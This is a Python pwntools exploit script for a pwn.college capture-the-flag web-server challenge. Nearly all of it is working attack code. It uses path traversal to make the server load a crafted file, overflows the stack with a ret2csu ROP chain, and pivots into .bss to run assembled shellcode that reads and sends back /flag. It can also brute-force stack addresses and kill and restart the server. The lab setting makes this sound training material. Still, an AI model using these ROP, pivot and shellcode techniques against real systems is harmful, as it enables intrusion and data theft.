#!/usr/bin/env python3
"""
Wily Webserver exploit v2 — ret2csu + .bss staging
Strategy: Use ret2csu to call read(4, .bss, 0x200), pipe stage2 shellcode into .bss, pivot there.

Gadgets (no PIE):
  pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret @ 0x401e6a
  mov rdx,r14;mov rsi,r13;mov edi,r12d;call [r15+rbx*8] @ 0x401e50

No need to know exact CONTENT — use self-referential pivot at known offset.
Brute-force the CONTENT address with auto-restart between attempts.
"""
from pwn import *
context.arch = "amd64"
context.log_level = "warn"
import os, sys, time

# ── Constants ──
H1 = b"HTTP/1.1 200 OK\nServer: pwnserver/1.33333333333333333333333333333.7\nX-Leetness-Level: 9001\nContent-type: "
CT = b"text/plain\n"
FS = 8190  # max file size (limit is 8191)
hs = len(H1) + len(CT) + len(b"Content-Length: " + str(FS).encode() + b"\n") + 1
RBP_OFF = 8200 - hs  # file offset for saved_rbp
RET_OFF = 8208 - hs  # file offset for ret_addr

# ret2csu gadgets
GADGET_POP = 0x401E6A  # pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret
GADGET_CALL = 0x401E50  # mov rdx,r14;mov rsi,r13;mov edi,r12d;call [r15+rbx*8]
RET = 0x40101A

# PLT/GOT
READ_GOT = 0x403F80
WRITE_GOT = 0x403F50
OPEN_GOT = 0x403FC8
BSS = 0x404800

# Stage 1: read(4, BSS, 0x200) to pull stage2 into .bss
# Stage 2 (in .bss): open("/flag",0);read(fd,BSS+0x100,200);write(4,BSS+0x100,200)
STAGE2 = asm("""
    /* open("/flag", 0) */
    xor eax,eax; push rax
    movabs rax,0x67616c662f; push rax
    mov rdi,rsp; xor eax,eax; mov al,2; xor esi,esi; syscall
    /* read(fd, BSS+0x100, 200) */
    mov edi,eax; xor eax,eax
    mov esi,0x404900; mov edx,200; syscall
    /* write(4, BSS+0x100, len) */
    mov edx,eax; xor eax,eax; mov al,1; mov edi,4
    mov esi,0x404900; syscall
    /* exit(0) */
    xor edi,edi; mov eax,60; syscall
""")


def build_stage1(content_addr):
    """Build the stage1 payload that calls read(4, BSS, 0x200) then pivots to BSS."""
    p = bytearray(FS)

    # ret2csu ROP chain starts at file offset RET_OFF
    rop_off = RET_OFF
    p[rop_off : rop_off + 8] = p64(GADGET_POP)  # ret_addr → pop gadget
    rop_off += 8

    # pop values
    p[rop_off : rop_off + 8] = p64(0)        # rbx = 0
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(1)        # rbp = 1 (loop once)
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(4)        # r12 = 4 → edi (client fd for read)
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(BSS)      # r13 → rsi (buffer)
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(0x200)    # r14 → rdx (count)
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(READ_GOT) # r15 → [r15] = read@glibc
    rop_off += 8

    # ret to gadget 2 (call [r15])
    p[rop_off : rop_off + 8] = p64(GADGET_CALL)
    rop_off += 8

    # After read returns, csu epilogue pops 6 more + ret
    # add rsp,8 then pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret
    p[rop_off : rop_off + 8] = p64(0)        # skip (add rsp,8)
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(0)        # rbx
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(0)        # rbp
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(0)        # r12
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(0)        # r13
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(0)        # r14
    rop_off += 8
    p[rop_off : rop_off + 8] = p64(0)        # r15
    rop_off += 8

    # Final ret → pivot to BSS (where stage2 will be after read)
    p[rop_off : rop_off + 8] = p64(BSS + 8)  # BSS+8 to skip first qword
    rop_off += 8

    # Set saved_rbp for self-referential pivot
    p[RBP_OFF : RBP_OFF + 8] = p64(content_addr + 8200)

    return bytes(p)


def req(path, timeout=5):
    try:
        s = remote("127.0.0.1", 80, timeout=timeout)
        s.send(f"GET /{path} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
        d = s.recvall(timeout=timeout)
        s.close()
        return d
    except:
        return None


def restart():
    os.system("fuser -k 80/tcp 2>/dev/null; sleep 1")
    os.system("nohup setarch x86_64 -R /challenge/integration-web-overflow >/dev/null 2>&1 &")
    for _ in range(10):
        time.sleep(0.5)
        if req("hacker_manifesto.txt", timeout=3):
            return True
    return False


def exploit_one(content_addr):
    """Try exploit with a given CONTENT address. Returns flag string or None."""
    payload = build_stage1(content_addr)
    open("/tmp/pwn", "wb").write(payload)

    try:
        s = remote("127.0.0.1", 80, timeout=3)
        s.send(b"GET /../../../tmp/pwn HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")

        # The server should now be executing our ROP chain
        # After read(4, BSS, 0x200), it's waiting for our stage2 data
        time.sleep(0.2)

        # Send stage2: first 8 bytes are garbage (popped by initial pivot), then shellcode
        stage2_payload = b"\x00" * 8 + STAGE2
        s.send(stage2_payload)

        # Now the server should pivot to BSS+8 and execute our shellcode
        r = s.recvall(timeout=3)
        s.close()

        if r and b"pwn.college{" in r:
            i = r.find(b"pwn.college{")
            j = r.find(b"}", i)
            return r[i : j + 1].decode()
    except:
        pass
    return None


# ── Main ──
if __name__ == "__main__":
    if "--brute" not in sys.argv:
        # Quick try: single address
        addr = 0x7FFFF7F7D580
        print(f"[*] Trying CONTENT={addr:#018x}")
        if not restart():
            print("[-] Cannot start server")
            sys.exit(1)
        flag = exploit_one(addr)
        if flag:
            print(f"[FLAG] {flag}")
            sys.exit(0)
        print("[-] Failed. Run with --brute to scan.")
        sys.exit(1)

    # Brute force
    print("[*] Starting brute force scan...")
    # Try ranges
    ranges = [
        (0x7FFFF7F7C000, 0x7FFFF7F84000, 0x1000),  # around GDB value
        (0x7FFFFFFDE000, 0x7FFFFFFFF000, 0x1000),  # classic stack top
        (0x7FFFFFFB0000, 0x7FFFFFFDE000, 0x1000),
    ]

    for lo, hi, step in ranges:
        print(f"[*] Range {lo:#x}-{hi:#x} step {step:#x}")
        for addr in range(lo, hi, step):
            if not restart():
                continue
            flag = exploit_one(addr)
            if flag:
                print(f"\n[+] CONTENT={addr:#018x}")
                print(f"[FLAG] {flag}")
                sys.exit(0)
            if addr % 0x40000 == 0:
                print(f"    {addr:#018x}...")

    print("[-] No working address found")
